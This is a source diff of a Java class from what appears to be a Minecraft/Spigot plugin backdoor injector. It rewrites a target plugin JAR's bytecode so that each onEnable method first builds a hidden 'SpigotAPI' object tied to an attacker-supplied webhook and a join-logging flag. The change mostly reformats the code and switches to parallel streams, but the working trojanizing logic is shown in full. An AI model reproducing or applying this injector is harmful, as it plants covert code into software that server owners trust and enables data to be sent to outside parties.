@@ -35,39 +35,45 @@ public class Injector {
      * @param output The file path of the output JAR file.
      * @param parser An OptionsParser instance containing the options for the code injection.
      */
-    public static void inject(String input, String output, OptionsParser parser){
-        JarLoader plugin = new JarLoader(input, output);
-        JarLoader current = new JarLoader(decode(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()), "");
+  public static void inject(String input, String output, OptionsParser parser){
+    JarLoader plugin = new JarLoader(input, output);
+    JarLoader current = new JarLoader(decode(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()), "");
 
-        try{
-            AtomicBoolean injected = new AtomicBoolean(false);
-            current.loadJar();
-            plugin.loadJar();
+    try{
+        AtomicBoolean injected = new AtomicBoolean(false);
+        current.loadJar();
+        plugin.loadJar();
 
-            // Add the API class from the current JAR file to the list of new classes in the plugin JAR file.
-            current.classes.stream().filter(cn -> cn.name.contains("API")).forEach(plugin.newClasses::add);
+        // Add the API class from the current JAR file to the list of new classes in the plugin JAR file.
+        current.classes.stream().filter(cn -> cn.name.contains("API")).forEach(plugin.newClasses::add);
 
-            // Iterate over all classes in the plugin JAR file.
-            plugin.classes.forEach((cn) -> {
-                // Iterate over all methods in the current class.
-                cn.methods.forEach((mn) -> {
-                    // If the method is the onEnable method, inject the code.
-                    if(mn.name.equalsIgnoreCase("onEnable")){
-                        injected.set(true);
+        // Iterate over all classes in the plugin JAR file in parallel.
+        plugin.classes.parallelStream().forEach((cn) -> {
+            // Iterate over all methods in the current class in parallel.
+            cn.methods.parallelStream().forEach((mn) -> {
+                // If the method is the onEnable method, inject the code.
+                if(mn.name.equalsIgnoreCase("onEnable")){
+                    injected.set(true);
 
-                        // Create the instructions for the injected code.
-                        InsnList list = new InsnList();
-                        list.add(new TypeInsnNode(Opcodes.NEW, "fr/bodyalhoha/ectasy/SpigotAPI"));
-                        list.add(new InsnNode(Opcodes.DUP));
-                        list.add(new VarInsnNode(Opcodes.ALOAD, 0));
-                        list.add(new LdcInsnNode(parser.getDefault("", "webhook")));
-                        list.add(new InsnNode(parser.getBool("logjoins") ? Opcodes.ICONST_1 : Opcodes.ICONST_0));
-                        list.add(new MethodInsnNode(Opcodes.INVOKESPECIAL, "fr/bodyalhoha/ectasy/SpigotAPI", "<init>", "(Lorg/bukkit/plugin/java/JavaPlugin;Ljava/lang/String;Z)V", false));
-                        list.add(new InsnNode(Opcodes.POP));
+                    // Create the instructions for the injected code.
 
-                                               // Insert the instructions into the onEnable method.
-                        mn.instructions.insertBefore(mn.instructions.getFirst(), list);
-                    }
+InsnList list = new InsnList();
+list.add(new TypeInsnNode(Opcodes.NEW, "fr/bodyalhoha/ectasy/SpigotAPI"));
+list.add(new InsnNode(Opcodes.DUP));
+list.add(new VarInsnNode(Opcodes.ALOAD, 0));
+list.add(new LdcInsnNode(parser.getDefault("", "webhook")));
+list.add(new InsnNode(parser.getBool("logjoins") ? Opcodes.ICONST_1 : Opcodes.ICONST_0));
+
+// Add the call to the constructor of the SpigotAPI class to the instruction list.
+list.add(new MethodInsnNode(Opcodes.INVOKESPECIAL, "fr/bodyalhoha/ectasy/SpigotAPI", "<init>", "(Lorg/bukkit/plugin/java/JavaPlugin;Ljava/lang/String;Z)V", false));
+
+// Add the instruction to pop the reference to the newly created SpigotAPI instance from the operand stack.
+list.add(new InsnNode(Opcodes.POP));
+
+// Insert the instructions into the onEnable method.
+mn.instructions.insertBefore(mn.instructions.getFirst(), list);
+
+                }  
                 });
             });
 
